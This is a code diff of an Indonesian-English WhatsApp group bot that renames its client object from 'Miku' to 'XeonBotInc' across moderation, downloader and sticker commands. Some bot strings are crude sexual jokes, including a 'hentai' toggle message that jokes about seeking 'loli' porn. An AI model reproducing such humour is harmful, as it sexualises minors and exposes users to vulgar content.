+ XeonBotInc.sendMessage(from, {text: `\`\`\`*「  Warning  」*\`\`\`\n\nAntilink is enabled!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!antiWame) return replay('Already deactivated')
  let off = nttoxic.indexOf(from)
@@ -2713,7 +2340,7 @@ break
    { buttonId: `-antiwame on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antiwame off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
    }
    }
    break
@@ -2736,13 +2363,13 @@ break
  if (args[0] === "on") {
  if (AntiNsfw) return replay('ᴜᴅᴀʜ ʜɪᴅᴜᴘ ᴅᴀʀɪ ᴛᴀᴅɪ ᴋᴀᴋ!')
  ntnsfw.push(from)
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 ᴘᴇʀʜᴀᴛɪᴀɴ! 」\`\`\`\n ᴍᴏᴅᴇ *ʜᴇɴᴛᴀɪ* ᴛᴇʟᴀʜ ᴅɪᴀᴋᴛɪғᴋᴀɴ!\n\nsᴇᴋᴀʀᴀɴɢ sᴇᴍᴜᴀ ᴍᴇᴍʙᴇʀ ʙɪsᴀ ᴀᴋsᴇs ɢᴀᴍʙᴀʀ ᴋᴀʀᴛᴜɴ ᴛᴇʟᴀɴᴊᴀɴɢ!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 ᴘᴇʀʜᴀᴛɪᴀɴ! 」\`\`\`\n ᴍᴏᴅᴇ *ʜᴇɴᴛᴀɪ* ᴛᴇʟᴀʜ ᴅɪᴀᴋᴛɪғᴋᴀɴ!\n\nsᴇᴋᴀʀᴀɴɢ sᴇᴍᴜᴀ ᴍᴇᴍʙᴇʀ ʙɪsᴀ ᴀᴋsᴇs ɢᴀᴍʙᴀʀ ᴋᴀʀᴛᴜɴ ᴛᴇʟᴀɴᴊᴀɴɢ!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiNsfw) return replay('ᴜᴅᴀʜ ᴍᴀᴛɪ ᴅᴀʀɪ ᴛᴀᴅɪ ᴋᴀᴋ!')
  let off = ntnsfw.indexOf(from)
@@ -2753,7 +2380,7 @@ break
    { buttonId: `-hentai on`, buttonText: { displayText: 'Aktifin' }, type: 1 },
    { buttonId: `-hentai off`, buttonText: { displayText: 'Matiin' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntnsfw, `sɪʟᴀʜᴋᴇᴜɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ɪɴɪ\n\nᴋᴇᴛᴀʜᴜᴀɴ ɴʏᴀʀɪ ʙᴏᴋᴇᴘ ʟᴏʟɪ = ғʙɪ ᴅᴀᴛᴀɴɢ ᴋᴇʀᴜᴍᴀʜ`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntnsfw, `sɪʟᴀʜᴋᴇᴜɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ɪɴɪ\n\nᴋᴇᴛᴀʜᴜᴀɴ ɴʏᴀʀɪ ʙᴏᴋᴇᴘ ʟᴏʟɪ = ғʙɪ ᴅᴀᴛᴀɴɢ ᴋᴇʀᴜᴍᴀʜ`, `${global.BotName}`, m)
    }
    }
 		
@@ -2795,7 +2422,7 @@ case 'listonline': case 'listaktif': case 'here':{
 let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
  let online = [...Object.keys(store.presences[id]), botNumber]
  let liston = 1
- Miku.sendText(m.chat, '  「 *Member yang lagi aktif* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
+ XeonBotInc.sendText(m.chat, '  「 *Member yang lagi aktif* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
  }
  break
 
@@ -2820,7 +2447,7 @@ case 'happymod': {
  buttons: buttons,
  headerType: 4
  }
- Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+ XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
  })
  }
  break
@@ -2836,7 +2463,7 @@ case 'happymod': {
  for (let i of search.all) {
  teks += `Hasil Nomer : ${no++}\n\nTitle : ${i.title}\n\nPenonton : ${i.views}\n\nDurasi : ${i.timestamp}\n\nDiupload : ${i.ago}\n\nAuthor : ${i.author.name}\n\nUrl : ${i.url}\n\n\n-----------------------------------------------------------------------------\n\n\n`
  }
- Miku.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
+ XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
  }
  break
 
@@ -2847,7 +2474,7 @@ case 'happymod': {
  if (!isBotAdmins) return replay(mess.botadmin)
  if (!isAdmins && !isCreator) return replay(mess.useradmin)
  if (!text) return replay('Pls enter -setname <New Group Name>  to change this Group Name')
- await Miku.groupUpdateSubject(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
+ await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
  }
  break
 
@@ -2856,7 +2483,7 @@ case 'block': {
     if (isBan) return reply(mess.banned)		
     if (isBanChat) return reply(mess.bangc)
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await Miku.updateBlockStatus(users, 'block').then((res) => m.reply(`Wakatta Ni-sama`)).catch((err) => reply(jsonformat(err)))
+await XeonBotInc.updateBlockStatus(users, 'block').then((res) => m.reply(`Wakatta Ni-sama`)).catch((err) => reply(jsonformat(err)))
  }
  break
 
@@ -2866,7 +2493,7 @@ case 'unblock': {
     if (isBanChat) return reply(mess.bangc)
     
      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-     await Miku.updateBlockStatus(users, 'unblock').then((res) => reply(`Wakatta oniichan!`)).catch((err) => reply(jsonformat(err)))
+     await XeonBotInc.updateBlockStatus(users, 'unblock').then((res) => reply(`Wakatta oniichan!`)).catch((err) => reply(jsonformat(err)))
  }
  break
 
@@ -2877,7 +2504,7 @@ case 'unblock': {
  if (!isBotAdmins) return replay(mess.botadmin)
  if (!isAdmins && !isCreator) return replay(mess.useradmin)
  if (!text) return replay('Pls enter -setname <New Group Description>  to change this Group Description.')
- await Miku.groupUpdateDescription(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
+ await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
  }
  break
 
@@ -2890,8 +2517,8 @@ case 'unblock': {
  if (!quoted) return replay(`Send/Reply Image With Caption ${prefix + command}`)
  if (!/image/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
  if (/webp/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
- let media = await Miku.downloadAndSaveMediaMessage(quoted)
- await Miku.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
+ let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+ await XeonBotInc.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
  replay(mess.jobdone)
  }
  break
@@ -2908,7 +2535,7 @@ case 'unblock': {
  for (let mem of participants) {
  teks += `» @${mem.id.split('@')[0]}\n`
  }
- Miku.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+ XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
  }
  break
 
@@ -2919,7 +2546,7 @@ case 'unblock': {
  if (isBanChat) return reply(mess.bangc)
  if (!m.isGroup) return replay(mess.grouponly)
  if (!isAdmins && !isCreator) return replay(mess.useradmin)
- Miku.sendMessage(m.chat, { text : args.join(" ") ? args.join(" ") : '' , mentions: participants.map(a => a.id)}, { quoted: m })
+ XeonBotInc.sendMessage(m.chat, { text : args.join(" ") ? args.join(" ") : '' , mentions: participants.map(a => a.id)}, { quoted: m })
  }
  break
 
@@ -2928,8 +2555,8 @@ case 'unblock': {
  if (isBanChat) return reply(mess.bangc)
  if (!m.isGroup) return replay(mess.grouponly)
  if (!isBotAdmins) return replay(mess.botadmin)
- let response = await Miku.groupInviteCode(m.chat)
- Miku.sendMessage(m.chat, {text:`*Nama Grup:* *${groupMetadata.subject}* \n\n*Link Grup :* \nhttps://chat.whatsapp.com/${response}l`, "contextInfo": {
+ let response = await XeonBotInc.groupInviteCode(m.chat)
+ XeonBotInc.sendMessage(m.chat, {text:`*Nama Grup:* *${groupMetadata.subject}* \n\n*Link Grup :* \nhttps://chat.whatsapp.com/${response}l`, "contextInfo": {
  mimetype: "image/jpeg",
  text: `${global.OwnerName}`,
  "forwardingScore": 1000000000,
@@ -2960,7 +2587,7 @@ case 'unblock': {
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
-    Miku.groupRevokeInvite(m.chat)
+    XeonBotInc.groupRevokeInvite(m.chat)
     }
     break
 
@@ -2972,9 +2599,9 @@ case 'unblock': {
      if (!isBotAdmins) return replay(mess.botadmin)
      if (!isAdmins && !isCreator) return replay(mess.useradmin)
      if (args[0] === 'close'){
-     await Miku.groupSettingUpdate(m.chat, 'announcement').then((res) => replay(`Group has been closed!`)).catch((err) => replay(jsonformat(err)))
+     await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replay(`Group has been closed!`)).catch((err) => replay(jsonformat(err)))
      } else if (args[0] === 'open'){
-     await Miku.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replay(`Group has been opened!`)).catch((err) => replay(jsonformat(err)))
+     await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replay(`Group has been opened!`)).catch((err) => replay(jsonformat(err)))
      } else {
      let buttons = [
      { buttonId: '-group open', buttonText: { displayText: 'Buka' }, type: 1 },
@@ -2988,7 +2615,7 @@ case 'unblock': {
      buttons: buttons,
      headerType: 4
      }
-     Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+     XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
      }
      }
      break
@@ -3000,7 +2627,7 @@ case 'unblock': {
      if (!isBotAdmins) return replay(mess.botadmin)
      if (!isAdmins && !isCreator) return replay(mess.useradmin)
      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-     await Miku.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replay(jsonformat(res))).catch((err) => replay(jsonformat(err)))
+     await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replay(jsonformat(res))).catch((err) => replay(jsonformat(err)))
      }
      break
 
@@ -3011,7 +2638,7 @@ case 'unblock': {
      if (!isBotAdmins) return replay(mess.botadmin)
      if (!isAdmins && !isCreator) return replay(mess.useradmin)
      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-     await Miku.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replay(`Wakatta!`)).catch((err) => replay(jsonformat(err)))
+     await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replay(`Wakatta!`)).catch((err) => replay(jsonformat(err)))
      }
      break
 
@@ -3023,7 +2650,7 @@ case 'unblock': {
      if (!isAdmins && !isCreator) return replay(mess.useradmin)
      if (args[0] === "@6285161888973") return reply ("Kamu mau miuna kick?")
      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-     await Miku.groupParticipantsUpdate(m.chat, [users], 'remove')
+     await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove')
      }
      break
 
@@ -3037,10 +2664,10 @@ case 'unblock': {
      let vcc = vdd.split("https://chat.whatsapp.com/")[1]
      if (!vcc) return replay("Link invalid!")
      if (isCreator) {
-     await Miku.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
+     await XeonBotInc.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
      replay("Aku udah masuk Ri oniichan")
      } else {
-     Miku.query({
+     XeonBotInc.query({
      tag: "iq",
      attrs: {
      type: "get",
@@ -3054,7 +2681,7 @@ case 'unblock': {
      teks = `Sorry, munimun 20 members are required in a group to add bot!`
      sendOrder(m.chat, teks, "667140254502463", fs.readFileSync('./Assets/pic7.jpg'), `${global.packname}`, `${global.BotName}`, "916909137213@s.whatsapp.net", "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==", "99999999999999999999")
      } else if (sizny > 20) {
-     await Miku.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
+     await XeonBotInc.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
      replay("Joined !")
      } else {
      replay("Error")
@@ -3070,7 +2697,7 @@ if (isBanChat) return reply(mess.banChat)
 				if (!text) return replay(`Tambahin Textnya!\n Contoh : *${prefix + command} Kapan saya bisa ngentot waifu?* `)
 					const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Months More','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Setelah Dajjal Turun',' 1 Abad Lagi','69 Abad Lagi',`After This Command, You Too ${q}`]
 					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
-                                         Miku.sendMessage(from, { text: `Question : ${q}\nAnswer : *${kapankah}*` }, { quoted: m })
+                                         XeonBotInc.sendMessage(from, { text: `Question : ${q}\nAnswer : *${kapankah}*` }, { quoted: m })
 		                          break
 		
 
@@ -3082,7 +2709,7 @@ case 'gurastick':{
 var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await Miku.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 await fs.unlinkSync(encmedia)
 }
 break	
@@ -3105,9 +2732,9 @@ case 'public': {
     if (isBan) return reply(mess.banned)	 			
  if (isBanChat) return reply(mess.bangc)
  if (!isCreator) return reply(mess.owner)
- Miku.public = true
+ XeonBotInc.public = true
  reply('Sekarang aku bisa diewe- digunakan oleh semua orang!')
- Miku.setStatus(`Mode : Public`)
+ XeonBotInc.setStatus(`Mode : Public`)
  }
  break
  
@@ -3115,9 +2742,9 @@ case 'public': {
     if (isBan) return reply(mess.banned)	 			
  if (isBanChat) return reply(mess.bangc)
  if (!isCreator) return reply(mess.botowner)
- Miku.public = false
+ XeonBotInc.public = false
  reply('Sekarang Cuma owner yang bisa ngen- menggunakan aku!')
- Miku.setStatus(`Mode : Self`)
+ XeonBotInc.setStatus(`Mode : Self`)
  }
  break
 
@@ -3128,13 +2755,13 @@ if (isBanChat) return reply(mess.bangc)
 if (!m.quoted) return reply('Reply Image')
 if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
 reply(mess.waiting)
-let media = await Miku.downloadAndSaveMediaMessage(quoted)
+let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 let ran = await getRandom('.png')
 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) throw err
 let buffer = fs.readFileSync(ran)
-Miku.sendMessage(m.chat, { image: buffer }, { quoted: m})
+XeonBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m})
 fs.unlinkSync(ran)
 })
 }
@@ -3147,9 +2774,9 @@ case 'tomp4': case 'tovideo': {
  if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
  reply(mess.waiting)
  let { webp2mp4File } = require('./lib/uploader')
- let media = await Miku.downloadAndSaveMediaMessage(quoted)
+ let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
  let webpToMp4 = await webp2mp4File(media)
- await Miku.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Here it is...' } }, { quoted: m })
+ await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Here it is...' } }, { quoted: m })
  await fs.unlinkSync(media)
  }
  break
@@ -3162,9 +2789,9 @@ case 'togif': case 'getgif':{
  if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
  reply(mess.waiting)
  let { webp2mp4File } = require('./lib/uploader')
- let media = await Miku.downloadAndSaveMediaMessage(quoted)
+ let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
  let webpToMp4 = await webp2mp4File(media)
- await Miku.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
+ await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
  await fs.unlinkSync(media)
  }
  break
@@ -3175,7 +2802,7 @@ case 'togif': case 'getgif':{
  if (isBanChat) return reply(mess.bangc)
  reply(mess.waiting)
  let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
- let media = await Miku.downloadAndSaveMediaMessage(quoted)
+ let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
  if (/image/.test(mime)) {
  let anu = await TelegraPh(media)
  reply(util.format(anu))
@@ -3188,7 +2815,7 @@ case 'togif': case 'getgif':{
  break*/
 
  case 'owner': case 'creator': case 'mod': case 'mods':{
-    Miku.sendContact(m.chat, global.Owner, m)
+    XeonBotInc.sendContact(m.chat, global.Owner, m)
     }
     break
 case 'translate' : case 'trans' : case 'tl' :
@@ -3216,11 +2843,11 @@ case 'tlindo': case 'transindo': {
 case 'scanime' :{
 if (!isMod) return reply (mess.mod)
  let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
- let media = await Miku.downloadAndSaveMediaMessage(quoted)
+ let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
  if (/image/.test(mime)) {
  let anu = await TelegraPh(media)
 ri = await fetchJson(`https://api.lolhuman.xyz/api/wait?apikey=${lolkey}&img=${util.format(anu)}`)
-Miku.sendMessage(m.chat, {video :{ url : ri.result.video}, caption : `Judul : ${ri.result.title_romaji}          Episode : ${ri.result.episode}.       Persamaan : ${ri.result.similarity}.`})
+XeonBotInc.sendMessage(m.chat, {video :{ url : ri.result.video}, caption : `Judul : ${ri.result.title_romaji}          Episode : ${ri.result.episode}.       Persamaan : ${ri.result.similarity}.`})
  } else if (!/image/.test(mime)) {
  let anu = await UploadFileUgu(media)
  reply(util.format(anu))
@@ -3260,7 +2887,7 @@ case 'kuso': case 'kusonime': {
     headerType : 4,
     }
     
-   Miku.sendMessage(from, riMessage).catch((err) => {
+   XeonBotInc.sendMessage(from, riMessage).catch((err) => {
                      reply(`Web Eror Atau Judul Salah!`)
                  })  
    
@@ -3290,7 +2917,7 @@ buttons: buttons,
 headerType: 4,
 
 }
-Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
 })
 }
 break
@@ -3344,7 +2971,7 @@ case 'google': case 'search': {
  buttons: buttons,
  headerType: 4
  }
- Miku.sendMessage(from, buttonMessage, {quoted:m})
+ XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
  })
  } catch (err) {
  reply("An Error Occured!")
@@ -3356,9 +2983,9 @@ case 'google': case 'search': {
     if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (args[0] === "mp4") {
-Miku.sendMessage(from, {video:{url:args[1]}, caption:'Here it is...', mimetype:'video/mp4'}, {quoted:m})
+XeonBotInc.sendMessage(from, {video:{url:args[1]}, caption:'Here it is...', mimetype:'video/mp4'}, {quoted:m})
 } else if (args[0] === "jpg") {
-Miku.sendMessage(from, {image:{url:args[1]}, caption:'Here it is...'}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:args[1]}, caption:'Here it is...'}, {quoted:m})
 } else {
 reply("Error! ")
 }
@@ -3370,7 +2997,7 @@ case 'jpeg': {
 if (isBanChat) return reply(mess.bangc)
  if (!args[0]) return reply(`Please provide link!`)
  try {
- Miku.sendMessage(from, {image:{url:args[0]}, caption:"Success!"}, {quoted:m})
+ XeonBotInc.sendMessage(from, {image:{url:args[0]}, caption:"Success!"}, {quoted:m})
  } catch {
  reply("Link Eror kek otakmu!")
  }
@@ -3385,7 +3012,7 @@ if (isBanChat) return reply(mess.bangc)
                  if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply('*Invalid link!*')
                  instagramdlv3(`${text}`).then(async (data) => {            
                  var buf = await getBuffer(data[0].thumbnail)        
-                 Miku.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail:buf, caption: `${BotName}`}, { quoted: m })
+                 XeonBotInc.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail:buf, caption: `${BotName}`}, { quoted: m })
                  }).catch((err) => {
                      reply(mess.error)
                  })
@@ -3404,7 +3031,7 @@ desc = ri.desc
 nail = ri.thumb
 const hd = ri.HD
 sd = ri.SD
-Miku.sendMessage(from, {video:{url:hd}, mimetype:"video/mp4", caption: 'Kualitas HD' }, {quoted:m})
+XeonBotInc.sendMessage(from, {video:{url:hd}, mimetype:"video/mp4", caption: 'Kualitas HD' }, {quoted:m})
 
             }
             break
@@ -3414,7 +3041,7 @@ if (!args.join(" ")) return reply (`Linknya kak?`)
 reply (mess.waiting)
 ri = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${lolkey}&url=${args.join(" ")}`)
 link = ri.result
-Miku.sendMessage(m.chat, {video : {url : link}, caption : `Miuna Facebook Downloader`},{quoted : m })
+XeonBotInc.sendMessage(m.chat, {video : {url : link}, caption : `Miuna Facebook Downloader`},{quoted : m })
 }
 break
 
@@ -3423,7 +3050,7 @@ if (!isCreator) return reply (mess.botowner)
     if (isBan) return reply(mess.banned)	 	
  if (isBanChat) return reply(mess.bangc)
  if (!args[0]) return reply (`Link?`)
- Miku.sendMessage(from,{video : {url : args[0]}, caption : `Yattaa..`})
+ XeonBotInc.sendMessage(from,{video : {url : args[0]}, caption : `Yattaa..`})
  }
  break
 case 'mp3': {
@@ -3431,7 +3058,7 @@ if (!isCreator) return reply (mess.botowner)
     if (isBan) return reply(mess.banned)	 	
  if (isBanChat) return reply(mess.bangc)
  if (!args[0]) return reply (`Link?`)
- Miku.sendMessage(from,{audio : {url : args[0]}, caption : `Silahkeun`})
+ XeonBotInc.sendMessage(from,{audio : {url : args[0]}, caption : `Silahkeun`})
  }
  break
 
@@ -3441,24 +3068,24 @@ if (!isCreator) return reply (mess.botowner)
 if (!q) return reply('Please provide the link !')
 reply(mess.waiting)
 if (!q.includes('tiktok')) return reply(`Invalid tiktok link!`)
- const musim_rambutan = await MikuTiktok(`${q}`).catch(e => {
+ const musim_rambutan = await XeonBotIncTiktok(`${q}`).catch(e => {
 reply(mess.error) 
 } )
- const mikutiktokop = musim_rambutan.result.watermark
+ const XeonBotInctiktokop = musim_rambutan.result.watermark
 texttk = `_Please choose the button below_`
 let buttons = [
 {buttonId: `-ttnowm ${q}`, buttonText: {displayText: 'Watermark Free'}, type: 1},
 {buttonId: `-ttaud ${q}`, buttonText: {displayText: 'Audio '}, type: 1}
 ]
 let buttonMessage = {
-video: {url:mikutiktokop},
+video: {url:XeonBotInctiktokop},
 caption: texttk,
 footer: `${BotName}`,
 buttons: buttons,
 headerType: 4,
 
 }
-Miku.sendMessage(from, buttonMessage, {quoted:m})
+XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
 }
 break
 
@@ -3468,12 +3095,12 @@ case 'tiktoknowm': case 'ttnowm':{
 if (!q) return reply('Please provide the link !')
 reply(mess.waiting)
 if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
- const musim_rambutan = await MikuTiktok(`${q}`).catch(e => {
+ const musim_rambutan = await XeonBotIncTiktok(`${q}`).catch(e => {
 reply(mess.error) 
 } )
 
- const mikutiktoknowm = musim_rambutan.result.nowatermark
-  Miku.sendMessage(from, { video: { url: mikutiktoknowm }, caption: "Here it is..." }, { quoted: m })
+ const XeonBotInctiktoknowm = musim_rambutan.result.nowatermark
+  XeonBotInc.sendMessage(from, { video: { url: XeonBotInctiktoknowm }, caption: "Here it is..." }, { quoted: m })
  }
 break
 
@@ -3509,7 +3136,7 @@ if (!isMod) return reply(`🤭🤭🤭`)
  headerType: 4,
 
  }
- Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+ XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
  }
  break
 case 'music': case 'play': case 'song': case 'ytplay': {
@@ -3544,7 +3171,7 @@ if (isBan) return reply(mess.banned)
  headerType: 4,
 
  }
- Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+ XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
  }
  break
 case 'ytad': {
@@ -3559,7 +3186,7 @@ case 'ytad': {
     let fileSizeInBytes = stats.size;
     if (fileSizeInBytes > 60000000) return reply('Gomenne, gabisa ngirim audio lebih dari *60MB* 🥺 ')
     
- await Miku.sendMessage(from, {document: fs.readFileSync(ytmp3play.path),fileName: anu.title + '.mp3',mimetype: 'audio/mpeg',}, {quoted:m})
+ await XeonBotInc.sendMessage(from, {document: fs.readFileSync(ytmp3play.path),fileName: anu.title + '.mp3',mimetype: 'audio/mpeg',}, {quoted:m})
  }
  break
 
@@ -3573,7 +3200,7 @@ case 'ytad': {
     const ytmp4play = await YT.mp4(anu.url)
     let vidduration =ytmp4play.duration;
     if (vidduration > 1800) return reply('Gomenne, gabisa ngirim vido lebih dari *30 menit* 🥺 ')
- Miku.sendMessage(from, {video:{url:ytmp4play.videoUrl}, mimetype:"video/mp4", caption:anu.title+'By *Miuna Downloader*',}, {quoted:m})
+ XeonBotInc.sendMessage(from, {video:{url:ytmp4play.videoUrl}, mimetype:"video/mp4", caption:anu.title+'By *Miuna Downloader*',}, {quoted:m})
  }
  break
  
@@ -3583,8 +3210,8 @@ if (isBanChat) return reply(mess.bangc)
          reply(mess.waiting)
          let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
          let random = anu[Math.floor(Math.random() * anu.length)]
-         Miku.sendMessage(m.chat, { image: { url: random.male }, caption: `Untuk Cowok...` }, { quoted: m })
-         Miku.sendMessage(m.chat, { image: { url: random.female }, caption: `Untuk Cewek...` }, { quoted: m })
+         XeonBotInc.sendMessage(m.chat, { image: { url: random.male }, caption: `Untuk Cowok...` }, { quoted: m })
+         XeonBotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Untuk Cewek...` }, { quoted: m })
      }
  break
 
@@ -3606,7 +3233,7 @@ case 'pinterest': case 'pin': {
  headerType: 4,
  
  }
- Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+ XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
  }).catch(_ => _)
  } catch {
  reply("Error")
@@ -3624,16 +3251,16 @@ const swn = args.join(" ")
 const pcknm = swn.split("|")[0];
 const atnm = swn.split("|")[1];
 if (m.quoted.isAnimated === true) {
-Miku.downloadAndSaveMediaMessage(quoted, "gifee")
-Miku.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
+XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
+XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
 } else if (/image/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await Miku.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds is allowed!')
 let media = await quoted.download()
